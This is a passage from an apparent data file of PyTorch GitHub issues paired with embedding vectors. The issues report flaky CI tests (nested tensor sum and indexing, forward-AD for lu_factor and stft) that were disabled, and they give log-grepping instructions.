 -0.34142685  0.37205476 -0.04499052 -0.31267932  0.2922739   0.02633437
 -0.24139245 -0.02924554 -0.1262492  -0.18003197  0.05311391 -0.14019862
 -0.4177372   0.23410077  0.35195142 -0.07052699  0.06202949 -0.11762153
 -0.20428185  0.06926745  0.25415033 -0.4083045  -0.225891   -0.28643626
  0.49521273  0.25528204  0.39279878 -0.21069315 -0.28120214 -0.21664223
  0.08037242  0.41830593 -0.10044141 -0.01957322 -0.0891333   0.15661906
  0.14561515 -0.0442098  -0.24261509 -0.09095339 -0.0754077   0.21516515
 -0.08544336  0.16250823  0.1398659  -0.20148793  0.13349353  0.1187177
  0.03212953 -0.0480521   0.0266445   0.37910542 -0.146612   -0.4083269
 -0.15732387  0.67297417  0.0272099  -0.22151601 -0.18174168  0.17035013
 -0.10992787  0.18455958 -0.15013763 -0.3529135   0.35404345  0.24897778
  0.13867359  0.08185357 -0.10346608  0.24222732  0.14686432  0.36367688
  0.3080827   0.5662265   0.4026649   0.36894882 -0.20667313  0.7456002
 -0.27620533  0.20492236 -0.3685941  -0.23014234 -0.1074764  -0.12782453
 -0.06444295 -0.02592625  0.01941856  0.07201194  0.19462007  0.06686676
 -0.18753155  0.05802307  0.2985949  -0.43632048  0.04175802 -0.10768561
 -0.17016166 -0.13432655 -0.06753661 -0.20368761 -0.2679835   0.03076263]"
DISABLED test_nested_tensor_sum_dim_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_sum_dim_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17987305754).

Over the past 3 hours, it has been determined flaky in 8 workflow(s) with 24 failures and 8 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_sum_dim_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.35852164 -0.04345014 -0.19000457 -0.02239792 -0.02421672 -0.4129065
  0.11697364  0.09836614 -0.31654572 -0.30021647  0.33592817 -0.16433598
  0.17017557  0.13077226 -0.03073973 -0.0644412  -0.21530944  0.01841923
  0.35160974  0.10802415 -0.05272274 -0.09268633 -0.31762618  0.27604705
  0.17455734  0.01683849 -0.11968921 -0.10074028  0.2587474   0.14314833
  0.35602117  0.08668353 -0.22245762  0.02387943  0.32963598  0.2645008
 -0.10622692 -0.068173   -0.32930693 -0.12261969  0.3446812   0.10436632
  0.01964845 -0.18422243  0.24877602  0.08502997 -0.09895521  0.138462
 -0.2195269  -0.00966055  0.10260876 -0.14366537 -0.01760763 -0.48994428
  0.04199227 -0.228663    0.247871    0.19929121  0.07064198  0.17545663
  0.03925763 -0.03991739 -0.04714054 -0.00392496 -0.01836417  0.10053672
  0.2650162  -0.25684172  0.47444558 -0.07655162  0.22601599 -0.08729911
 -0.28406972  0.14467853  0.14005896  0.23195219 -0.13233283  0.08981919
  0.02406792  0.01454141 -0.15184575  0.01904546  0.07898678 -0.01349182
  0.17477846  0.00560849  0.2049055   0.069846    0.21800518 -0.37237775
  0.27619445  0.31818646 -0.23724285 -0.02855883 -0.09772008 -0.03997923
  0.41916114 -0.13809016 -0.41209698  0.20325577  0.06524482 -0.3953684
 -0.19003965  0.36274606 -0.17612967 -0.11273434  0.43128064 -0.09255973
  0.06028895 -0.16593719  0.20264599 -0.06855179  0.19828834  0.18128115
  0.01926918 -0.11644682 -0.15341476  0.02277032  0.0746261   0.6257473
 -0.23466367 -0.11590275  0.14683744  0.04020609  0.34267834  0.0634694
 -0.15790269  0.04041952  0.12925434 -0.0641288   0.07145088  0.09241154
 -0.2522237  -0.03865452  0.06891868  0.0406692  -0.11469239 -0.19828884
  0.05112819 -0.02682164 -0.25873554  0.15188053 -0.07052876 -0.3070866
  0.6044265   0.07099132 -0.12182399  0.0169429  -0.07993521  0.04335995
  0.01735917  0.1125535   0.26364198  0.3083491   0.00652074  0.04708877
  0.44905344  0.1164443  -0.05659634 -0.2215353  -0.0183162   0.4558784
 -0.13862985  0.05200189  0.18784118 -0.1016297  -0.57089746 -0.01144825
  0.00847396  0.23439707 -0.04682501 -0.03913417 -0.04585092 -0.01400979
 -0.02485536 -0.04537055  0.15819053 -0.44113508 -0.15135948  0.20127398
  0.0486191  -0.01962339  0.23515108  0.0344755  -0.15186216  0.12096101
  0.20221917 -0.1678094  -0.00724318 -0.1149763  -0.61550033 -0.14916594
  0.11028346 -0.00253189 -0.21982722 -0.21545927  0.11148188 -0.14106455
 -0.00119446  0.04861505 -0.2078538   0.18375614  0.1664257  -0.08627661
  0.1706245   0.02365208 -0.12879194 -0.50238705  0.14917758  0.10582153
 -0.11704792 -0.15845454 -0.09957309 -0.17434308 -0.01183757  0.06239646
 -0.06457502 -0.12153189 -0.13316688  0.30224752 -0.21126182 -0.16456245
 -0.39546657 -0.18628708 -0.48788399 -0.16244256 -0.33242106  0.25266215
 -0.06442603  0.10907023 -0.11041706 -0.27911243  0.1136809  -0.04807952
  0.33977157 -0.44421616 -0.3322206  -0.11379315 -0.07172087  0.4675314
 -0.59427154 -0.44998875 -0.03215856  0.11221489 -0.06386176  0.1534378
 -0.02040308 -0.03623549 -0.23430431  0.20591837 -0.2096118  -0.26820678
  0.04401664  0.06360995  0.16663179  0.32251254 -0.0549226   0.01350204
 -0.01203537  0.00623889  0.15666294  0.2432833  -0.23990862  0.4764371
  0.08323209  0.18943372 -0.29188544  0.25626227  0.08930814 -0.1398323
  0.3811134  -0.5311115   0.19564265 -0.0072074   0.01787152 -0.34672707
  0.47075045  0.31466687 -0.21806373 -0.19267932  0.25635523  0.18251055
 -0.18525174 -0.12837064  0.06871468 -0.383488   -0.15615976 -0.16140488
 -0.1541698  -0.03709678 -0.08270195  0.2822823   0.12537411 -0.06257416
 -0.46091104  0.05411181  0.3919981  -0.2219511  -0.00333047 -0.09832749
 -0.13629451 -0.01870529  0.23504317 -0.3754577   0.13934976 -0.1613301
  0.23464637  0.02828991  0.35353047 -0.3779214   0.24691877  0.1811158
  0.01194264  0.36669356 -0.01267767  0.03335786 -0.11912139  0.41494596
  0.10296121  0.13979106  0.34434122 -0.20690274 -0.47222722  0.04960361
  0.11928935 -0.13554186 -0.31998304 -0.20915496 -0.11772845 -0.02606529
 -0.19942147 -0.11355514 -0.23378168 -0.17864434  0.03946365 -0.10663375
 -0.15644382  0.6055133  -0.01520456 -0.24495164  0.16159016  0.01531139
  0.07169105 -0.34862918 -0.08033377 -0.22794977  0.30118197  0.16606419
  0.23081735  0.15321438 -0.10802824  0.13655321 -0.18289943 -0.08345293
  0.19077967  0.5278244   0.01205745  0.08317441  0.30784845  0.66386867
 -0.23393786  0.10485221 -0.42442796 -0.37086898  0.35462433 -0.19019863
 -0.00665173 -0.14014813  0.11151019  0.40822148 -0.38687336  0.36630732
 -0.13858017  0.34534997  0.16110629 -0.16419625  0.13803554 -0.05839069
  0.01877222 -0.04180199 -0.07382736  0.06777204  0.03023414  0.15083106]"
DISABLED test_nested_tensor_indexing_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_indexing_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17979964194).

Over the past 3 hours, it has been determined flaky in 7 workflow(s) with 21 failures and 7 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_indexing_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.36248666 -0.14490226 -0.24671574  0.00540226  0.03337591 -0.38096136
  0.11840558 -0.06596646 -0.35950327 -0.19950011  0.39740562 -0.04323521
  0.13482401  0.16364995 -0.13196437 -0.02080425 -0.2796822  -0.09890356
  0.32242504  0.09795041 -0.11899222 -0.07091135 -0.35964763  0.1862272
  0.17099905  0.00467466 -0.17626122 -0.03952377  0.22215928  0.18468581
  0.401264    0.08383858 -0.3116298   0.01899015  0.37216732  0.29669636
 -0.14862323 -0.08925165 -0.27202976 -0.16261601  0.2950461   0.0395852
  0.07298405 -0.20278774  0.28291187 -0.0128578  -0.09893764  0.13151288
 -0.18097365 -0.04829633  0.03862179 -0.18788613 -0.11111575 -0.46575952
  0.09141496 -0.19585611  0.21281536  0.2630632   0.09576649  0.08038969
  0.05364886  0.00597814  0.01964383  0.00398719 -0.09623892  0.08788384
  0.25014016 -0.36279374  0.56946564 -0.05366553  0.3095167   0.04693756
 -0.2981304   0.12720352  0.15033174  0.29040965 -0.16292319  0.06874183
  0.05426282  0.03582057 -0.1756842  -0.09333695  0.14222614 -0.08336644
  0.16659151 -0.01228383  0.18095863  0.01078356  0.3794396  -0.2953787
  0.37601644  0.2231712  -0.23137625 -0.1788372  -0.03943903 -0.06221951
  0.3645805  -0.04126757 -0.41741163  0.160796    0.06786813 -0.43867463
 -0.22885938  0.39457148 -0.10228336 -0.02216298  0.37324616 -0.16313186
  0.02210621 -0.14550957  0.17567533 -0.05317049  0.15760699  0.18525626
  0.02910782 -0.05805093 -0.09248052  0.00351355  0.20356658  0.6790379
 -0.3442604  -0.15792856  0.11880613  0.03144745  0.39388907  0.14770672
 -0.14362097  0.03336077  0.10983483 -0.01038158  0.08654661  0.0920711
 -0.32401004 -0.03497334  0.00999561  0.04704956 -0.15758112 -0.30754325
  0.01419151  0.04845741 -0.19656332  0.16814461 -0.0230783  -0.2136093
  0.48088413  0.08338386 -0.19440621  0.04447637 -0.16871491  0.05251654
 -0.07248455  0.12740791  0.18125892  0.3745184   0.00672684  0.03556164
  0.38020185  0.0626125  -0.04482808 -0.19789903 -0.02579003  0.4224546
 -0.19548468  0.10034293  0.3403919  -0.06581909 -0.48597163 -0.01793755
  0.01529536  0.19154097 -0.08275622 -0.04159391 -0.0068597   0.07213779
 -0.02014529 -0.05895269  0.25619262 -0.5931692  -0.08383993  0.21780005
  0.08240651 -0.08175206  0.1913042   0.10574204 -0.07955885  0.11451589
  0.23471735 -0.17791377  0.04632542 -0.15236282 -0.4397921  -0.20014301
  0.15348992 -0.01789994 -0.22069807 -0.27489367  0.11687633 -0.08069284
 -0.02672977 -0.00472824 -0.0814747   0.14113322  0.19116785 -0.1062829
  0.03324974 -0.06797023 -0.123868   -0.44171408  0.11153807  0.12541717
 -0.11366596 -0.11726785 -0.13713962 -0.3493228  -0.0843711   0.0127473
 -0.02770992 -0.12795457 -0.06520019  0.31345794 -0.21170141 -0.17507641
 -0.32583606 -0.13440253 -0.5823776  -0.23262271 -0.26638156  0.19699511
 -0.16335197  0.06688823 -0.11210656 -0.21250406  0.23249955 -0.12852196
  0.34762013 -0.3987761  -0.31531906 -0.09972583  0.0260133   0.5617529
 -0.6772651  -0.39924812 -0.01726044  0.06800899 -0.09310891  0.07236344
  0.04048748  0.06186923 -0.22316122  0.18019031 -0.04629209 -0.3648218
  0.18216808  0.01313517  0.16675633  0.31276166 -0.07547019  0.13018207
 -0.02538767  0.11618156  0.18635689  0.22924647 -0.13772148  0.49238268
  0.10129604  0.25529787 -0.30697167  0.26486874 -0.00777649 -0.14417803
  0.41538578 -0.29577965  0.11322947 -0.07810401  0.05469586 -0.25003967
  0.33266526  0.2603929  -0.18496616 -0.14857653  0.21914767  0.14983325
 -0.21218836 -0.06638849 -0.00524163 -0.32033145 -0.19312704 -0.08151829
 -0.21990457  0.01663593 -0.12055705  0.22728816  0.14024147 -0.01255877
 -0.43067354  0.06877413  0.39956877 -0.2653479   0.0490537  -0.02439409
 -0.02961636  0.02038367  0.18074821 -0.38151738  0.04040092 -0.10377456
  0.18252257  0.02997182  0.3035085  -0.3640253   0.27292177  0.17300358
 -0.04308943  0.31019554  0.11040575 -0.02110664 -0.22038695  0.3437776
  0.11907692  0.1834905   0.28136557 -0.2266016  -0.40823814  0.14246571
  0.11797652 -0.08949672 -0.25564885 -0.19767478 -0.13333642 -0.07340628
 -0.1885931  -0.2046374  -0.25564462 -0.11270771 -0.01843523 -0.14081526
 -0.22122324  0.49819258  0.01104079 -0.1518656   0.21992192 -0.06211651
  0.12356889 -0.3969382  -0.11365332 -0.19891477  0.30210918  0.15273577
  0.21012668  0.25883508 -0.11950663  0.09978221 -0.26372537  0.0008306
  0.23984371  0.5422714   0.05329539  0.06851651  0.19490644  0.5346494
 -0.21987028  0.02260493 -0.39776695 -0.37802234  0.3467846  -0.17489716
  0.0106614  -0.17098206  0.2326497   0.39467126 -0.395646    0.25319046
 -0.08914249  0.31098336  0.18263796 -0.2247374   0.07033588 -0.06779771
  0.03115301 -0.10767544 -0.0275593   0.09817778 -0.00739477  0.164154  ]"
DISABLED test_forward_ad_linalg_lu_factor_cuda_float32 (__main__.TestCompositeComplianceCUDA) triaged module: flaky-tests skipped module: unknown,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_forward_ad_linalg_lu_factor_cuda_float32&suite=TestCompositeComplianceCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17981993578).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 3 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_forward_ad_linalg_lu_factor_cuda_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_ops.py`",False,"[-2.50478745e-01 -1.05341867e-01 -2.02140659e-01  1.03970185e-01
 -4.05653305e-02 -3.34603727e-01  2.01822400e-01  2.46897340e-04
 -3.06430370e-01 -4.05914307e-01  3.20083231e-01 -2.46871948e-01
  2.72755265e-01 -2.13406160e-02 -2.03489035e-01 -2.40380406e-01
 -1.49098471e-01  1.33161247e-01  2.52166688e-01  1.05643868e-02
 -2.81881630e-01 -1.92420661e-01 -2.16399178e-01  2.68661499e-01
 -1.16555937e-01 -8.10711160e-02 -1.46409810e-01 -2.34434418e-02
  5.82169667e-02  2.15539664e-01  3.40194762e-01  2.38650650e-01
 -2.92298675e-01 -1.44225091e-01  2.21448019e-01  1.19706847e-01
 -3.01967949e-01 -4.02672172e-01 -3.34199041e-01 -2.96457618e-01
  1.31483167e-01 -1.98804110e-01  5.76471761e-02  9.19217765e-02
 -3.24194804e-02 -1.44792497e-01 -1.01604506e-01  2.16254205e-01
 -2.79411346e-01  4.39908281e-02  2.09571436e-01 -3.85827124e-01
  4.20690887e-02 -3.09278607e-01  2.14736834e-02 -5.77143788e-01
  2.67914355e-01  3.39821815e-01  2.27796853e-01  2.69074321e-01
 -1.16912380e-01  1.19613022e-01 -3.84349227e-02  4.00740504e-02
 -1.99633926e-01  1.67958617e-01 -3.79609168e-02 -2.05691427e-01
  4.61988509e-01  1.25930980e-01  2.23254003e-02  7.77880251e-02
 -4.70749199e-01 -1.15957111e-02  1.14880994e-01  1.91817835e-01
 -1.54259115e-01  1.51376903e-01 -4.60634334e-03  5.93739152e-02
  3.01487654e-01  8.86438787e-02 -7.83752128e-02 -1.85481742e-01
  1.80196568e-01  1.80367395e-01  1.54889733e-01 -1.52205471e-02
  8.06091726e-02 -3.08158100e-01  4.52313930e-01  7.77362436e-02
 -1.85648143e-01  2.08356269e-02 -1.16003282e-01  2.15473264e-01
  3.09072644e-01 -1.57481909e-01 -4.63562906e-01 -1.14596814e-01
  1.74676180e-01 -3.45081747e-01 -1.73435315e-01  6.51271045e-01
 -3.19615394e-01 -2.45388616e-02  4.39129949e-01 -5.19424155e-02
  5.10547012e-02 -2.21166313e-01  2.61066202e-03 -1.51090175e-01
  4.53230329e-02 -3.11452448e-02 -1.33731931e-01 -8.32958072e-02
 -1.72042221e-01 -2.33599409e-01  6.10339865e-02  2.42073372e-01
 -1.78498402e-01 -2.10583746e-01  2.92566478e-01 -2.49549329e-01
  5.64996600e-01  1.12447999e-02 -8.36746246e-02  9.48596895e-02
 -1.60656154e-01 -2.05923080e-01  2.61417955e-01  8.99453089e-02
 -2.35123262e-01 -1.64904416e-01 -6.80230260e-02  1.24278739e-01
 -2.93711543e-01 -1.97123975e-01 -1.19515374e-01  6.93615526e-03
 -3.10540259e-01  7.76378214e-02  2.50809547e-02  1.00891858e-01
  3.35492879e-01 -1.43640444e-01  8.72102287e-03  3.07531744e-01
 -3.52276140e-03  2.02766880e-01  1.79418251e-01  4.37322780e-02
  1.40996575e-02  4.91230577e-01 -8.83277506e-02 -3.09360083e-02
  2.95382917e-01 -1.02292039e-02  1.41767785e-02 -3.86443079e-01
 -7.55271390e-02  4.64302301e-01 -2.16010571e-01  1.23442002e-01
 -9.57753807e-02  1.63966730e-01 -3.63957167e-01  2.40011632e-01
 -1.04406521e-01  1.18784994e-01  1.01344615e-01  2.89878398e-02
  2.94784576e-01  8.56182724e-02  1.12599358e-01 -2.27421731e-01
  2.12010473e-01 -1.01468541e-01 -1.89169105e-02  4.04378176e-01
 -1.45741582e-01  2.61081904e-01  3.58346045e-01  1.86406344e-01
  7.24970698e-02  2.06262380e-01  7.65532702e-02 -5.48388101e-02
  8.49566907e-02 -6.64949119e-02 -3.67217541e-01 -2.33541965e-01
  1.67708278e-01  5.60336038e-02 -3.47833693e-01 -1.42472029e-01
  2.27717087e-01  1.32986769e-01 -7.38381408e-03  5.23312502e-02
 -4.96389389e-01  2.14870065e-01  2.84516484e-01 -1.42370597e-01
 -3.11766677e-02  1.42536089e-01  1.04029007e-01 -3.80201787e-01
  3.52088034e-01  3.50441411e-02 -3.20593894e-01 -8.53402168e-02
 -1.66536763e-01 -2.41575211e-01 -1.92852914e-01  9.09974575e-02
  1.59388315e-02 -2.26818502e-01  2.23437458e-01  3.12562972e-01
 -3.87213118e-02 -2.50828713e-02  7.48892203e-02 -9.58589688e-02
 -2.02306122e-01 -6.40125424e-02  9.28587466e-03  1.46528274e-01
 -9.61355418e-02  1.37416914e-01 -2.36286670e-02 -3.03651035e-01
  3.68171751e-01  2.51038134e-01  9.08094049e-02 -1.53419197e-01
 -1.50186718e-01 -2.82205015e-01  7.29617998e-02  3.05265963e-01
 -4.34825897e-01 -4.73356903e-01 -8.41932595e-02  1.74805552e-01
 -5.45253828e-02  5.12466669e-01  1.68460310e-02 -4.30717692e-02
 -4.10807520e-01 -2.30942369e-01  3.37821729e-02 -5.28699160e-01
  1.91119686e-01  9.90982652e-02  2.82558978e-01  1.87067524e-01
  1.42553300e-01  8.66723359e-02  9.08345655e-02 -3.25466752e-01
  2.69639015e-01  6.41400456e-01 -3.26057285e-01  3.38930190e-01
  1.91260606e-01  2.18463123e-01 -2.49462157e-01  5.81970960e-02
 -1.54877633e-01  3.78320478e-02  1.36028647e-01 -5.32162189e-01
  3.72056127e-01 -1.46310488e-02  2.76982963e-01 -3.92163664e-01
  4.44483846e-01  8.32146555e-02  3.18979612e-03  1.08998902e-02
  3.37972939e-01  7.55236149e-02  9.68372971e-02  9.64101255e-02
  1.81044459e-01  4.29442562e-02 -6.05302006e-02 -2.58216321e-01
 -1.64146483e-01 -9.87989455e-02 -5.82997836e-02  3.23897421e-01
  1.59379780e-01 -1.03547856e-01 -2.13109851e-01  7.26722926e-03
  1.91582575e-01 -2.22692519e-01  1.99785560e-01 -1.28024489e-01
 -3.38885069e-01  1.10552609e-01 -9.66698024e-03 -2.73622364e-01
  2.28796288e-01 -8.46266747e-03  8.96930099e-02  1.42911926e-01
 -1.89653151e-02 -3.43778908e-01  1.30716674e-02  1.78095847e-01
 -7.38369152e-02  1.37283295e-01  1.70840561e-01  1.17944151e-01
 -9.66160148e-02  2.44401574e-01  1.21086024e-01  1.78073391e-01
  5.98657988e-02 -2.24845558e-01 -5.10042191e-01  1.53589975e-02
  5.22957556e-03 -6.13960996e-02 -4.72146988e-01 -2.01531261e-01
 -6.88786730e-02  6.45233504e-03  1.21339411e-03 -4.27952409e-02
 -7.28700012e-02 -6.52941391e-02 -1.70329660e-01 -2.22857948e-02
 -3.22459072e-01  3.76832366e-01  2.69456863e-01 -1.52481288e-01
  7.81803280e-02 -6.39441088e-02  5.77873811e-02 -3.50289226e-01
 -9.50484425e-02 -1.13833278e-01  1.35318264e-01  4.10579354e-01
  2.91853130e-01 -3.10486164e-02 -3.72314714e-02 -2.22660691e-01
 -3.41773003e-01 -7.38433097e-03 -1.53286587e-02  5.20294428e-01
  2.19340444e-01 -7.85445124e-02  2.87080258e-01  3.73072684e-01
 -1.81907266e-01 -1.47760361e-01 -1.85028762e-01 -4.45719063e-01
  1.07294321e-01 -1.37666672e-01  5.32567799e-02 -3.18288386e-01
  3.55019569e-01  7.13231340e-02 -3.27535927e-01  4.73804697e-02
 -2.37533092e-01  1.90806478e-01  2.75883555e-01 -2.17831001e-01
  4.37633730e-02  7.33426120e-03  2.53376961e-01 -1.21790439e-01
  2.89588608e-03 -6.39319941e-02  1.52811199e-01  3.75860244e-01]"
DISABLED test_forward_ad_stft_cuda_float32 (__main__.TestCompositeComplianceCUDA) triaged module: flaky-tests skipped module: unknown,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_forward_ad_stft_cuda_float32&suite=TestCompositeComplianceCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17979958785).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_forward_ad_stft_cuda_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_ops.py`",False,"[-2.81747103e-01 -1.94895744e-01 -2.97179997e-01  5.06125763e-02
  1.74383260e-02 -4.91514862e-01  5.26880957e-02  5.27812121e-03
 -3.13463449e-01 -3.28422308e-01  2.37717941e-01 -2.50738204e-01
  2.29791626e-01  7.82702789e-02 -2.29573414e-01 -1.80479467e-01
 -1.12685673e-01 -8.75998065e-02  5.52108407e-01  3.38918567e-02
 -3.15805674e-01 -2.33409852e-02 -1.86222017e-01  1.91457421e-01
 -1.33987501e-01 -7.38836750e-02 -1.85597539e-01 -9.78127122e-02
 -5.15451096e-02  1.08860537e-01  3.22269857e-01  1.09741494e-01
 -3.57902408e-01 -3.08560319e-02  3.01573098e-01  9.54523012e-02
 -3.84788811e-01 -2.90884197e-01 -2.48047233e-01 -2.63506651e-01
 -4.26138416e-02 -2.19872996e-01 -1.02826189e-02  4.08019964e-03
 -4.61347401e-02 -7.04590231e-02 -1.73213974e-01  2.77294159e-01
 -1.72013730e-01 -5.72347641e-02  3.18100482e-01 -2.25785002e-01
  1.52095780e-03 -3.48810405e-01  6.09235689e-02 -4.09770668e-01
  2.52554733e-02  2.79594958e-01  1.82961613e-01  2.86601663e-01
  7.80063346e-02  1.42142266e-01 -1.01161689e-01 -7.77110737e-03
 -8.68706778e-02  2.21676946e-01 -3.81984897e-02 -1.25551075e-01
  4.65195954e-01  8.41712505e-02 -5.39985001e-02  1.50848955e-01
 -4.33737874e-01  7.49749225e-03  6.60554916e-02  2.38885924e-01
 -7.03825802e-02 -1.50014218e-02 -8.27965885e-02 -2.63996441e-02
  1.03191316e-01  1.64609939e-01 -3.52667421e-02 -4.87824380e-02
  1.59860492e-01  8.09829161e-02  1.46329641e-01  1.58070168e-03
  7.41417408e-02 -2.97871053e-01  3.88662696e-01  1.87345445e-01
 -2.25953013e-01  1.46971881e-01 -1.50483698e-01  9.66816545e-02
  2.89826453e-01 -1.82533488e-01 -3.59285116e-01 -8.81462097e-02
  2.11847395e-01 -2.86732614e-01 -6.27820939e-02  4.77932274e-01
 -2.89627820e-01 -9.07493085e-02  4.03365493e-01  1.04920939e-04
  1.59511328e-01 -9.79086906e-02 -6.91821054e-02 -7.19755515e-02
  6.63360581e-03 -2.72883475e-02 -1.16546609e-01  2.98797749e-02
 -3.52895796e-01 -3.69234294e-01 -1.06001748e-02  2.84927875e-01
 -2.17059731e-01 -1.22151367e-01  2.44587198e-01 -1.91418603e-01
  4.89701599e-01 -6.36740327e-02  3.29150856e-02  7.44771510e-02
 -1.70699745e-01 -2.15857819e-01  1.92460090e-01 -4.60529886e-03
 -7.96790347e-02 -8.71932134e-02  8.79033059e-02  2.16625065e-01
 -2.17132717e-01 -9.45941508e-02 -4.47861329e-02 -6.08554929e-02
 -2.38129675e-01  1.24067307e-01 -5.16030863e-02 -9.66521651e-02
  2.38992035e-01 -5.77757396e-02 -2.04523847e-01  3.38339269e-01
 -3.06538008e-02  1.85839996e-01  2.28771776e-01  7.42451251e-02
 -1.43490033e-02  5.43077707e-01 -1.56363368e-01  1.36707082e-01
  3.65080088e-01  8.06111768e-02  8.21720809e-02 -2.97977686e-01
 -9.38046128e-02  5.06675422e-01 -9.26756412e-02  1.57483742e-02
  2.28047930e-02 -4.35087793e-02 -3.09567690e-01  1.98383361e-01
 -1.64701045e-01  1.85247496e-01  5.37056215e-02 -3.86849344e-02
  2.23548740e-01  2.55362634e-02  1.09310597e-02 -1.48891926e-01
  2.21692443e-01 -8.59500915e-02  4.25355434e-02  3.90563667e-01
 -2.36479074e-01  2.92191833e-01  2.71413952e-01  2.08846211e-01
  4.53080684e-02  2.57467389e-01  2.09882885e-01 -5.38559668e-02
  3.26083228e-02  2.82219052e-02 -3.59019637e-01 -3.23498428e-01
  1.72037408e-02  5.09016737e-02 -2.94723451e-01  6.32723700e-03
  2.11285144e-01  7.40055367e-03  8.09432715e-02  3.15035209e-02
 -3.50781262e-01  1.15234748e-01  3.06295574e-01 -5.18189929e-02
 -1.46902531e-01  6.23689815e-02  7.77806714e-02 -4.42372262e-01
  3.12659383e-01  1.04242302e-02 -3.33359063e-01 -1.31022856e-01
 -1.61009341e-01 -2.51843572e-01 -1.04655877e-01 -1.60117578e-02
  1.01418957e-01 -1.87390763e-02  5.23019359e-02  2.45070055e-01
 -7.17237741e-02 -1.35343805e-01  1.20550543e-01 -1.33828655e-01
 -9.33858659e-03 -1.35170192e-01 -2.52303798e-02  4.19226289e-02
 -7.01341927e-02  2.22446378e-02  6.32990822e-02 -1.24301389e-01
  9.27500948e-02  2.09247351e-01  1.29842699e-01 -4.31107264e-03
 -1.47320658e-01 -1.56965494e-01 -4.33167256e-02  4.00981486e-01
 -3.16846728e-01 -3.96927267e-01 -1.41512409e-01  2.32874334e-01
  6.73912391e-02  3.37315053e-01 -3.47218886e-02 -7.59640187e-02
 -3.57617050e-01 -1.43884003e-01  1.23914063e-01 -4.37880456e-01
  2.77109385e-01  2.89911572e-02  1.63943827e-01  4.00880456e-01
  2.99666375e-02  1.16639405e-01  6.50581345e-02 -1.91342831e-01
  1.96945295e-01  5.59890032e-01 -1.60844535e-01  1.69824541e-01
  1.99751362e-01  1.72701776e-01 -2.20755145e-01  1.45476580e-01
 -5.61873727e-02 -5.77210821e-02  2.52585933e-02 -4.25447464e-01
  3.63798022e-01  3.31522524e-02  3.58733058e-01 -3.82541180e-01
  4.20494705e-01 -1.17282001e-02  1.07981183e-01  7.47970417e-02
  2.87879646e-01 -1.69396829e-02  1.05975367e-01  9.36302096e-02
  8.12965930e-02 -6.85722679e-02 -5.66940159e-02 -2.94166118e-01
 -1.69138223e-01 -1.09952077e-01 -7.38018230e-02  3.05846512e-01
  2.14440107e-01 -1.44185305e-01 -2.33622670e-01  2.00632364e-02
  2.32599139e-01 -1.68696135e-01  2.77464688e-01 -7.20723718e-02
 -3.43556583e-01 -1.49061441e-01  3.15381922e-02 -2.98630714e-01
  2.03940451e-01  1.20875426e-02  1.66016400e-01  1.35308966e-01
  1.12233676e-01 -4.51955259e-01 -2.81617902e-02  6.83213621e-02
 -1.37999132e-01  1.84686840e-01  1.36572748e-01  1.06984526e-01
 -6.36564717e-02  2.37448812e-01  1.29547328e-01  1.48927897e-01
  1.18449945e-02 -1.96797729e-01 -3.24920863e-01 -1.79731362e-02
 -5.03825657e-02  2.95097195e-03 -1.98356360e-01 -1.37956366e-02
 -2.13554613e-02 -4.95457202e-02 -1.00447945e-02 -6.81328028e-02
 -2.84153447e-02 -5.24112061e-02 -1.24577157e-01  4.37261760e-02
 -2.67396331e-01  2.35088274e-01  2.03374326e-01 -1.49959683e-01
 -8.76583830e-02 -1.55678466e-01 -1.71076842e-02 -2.96367407e-01
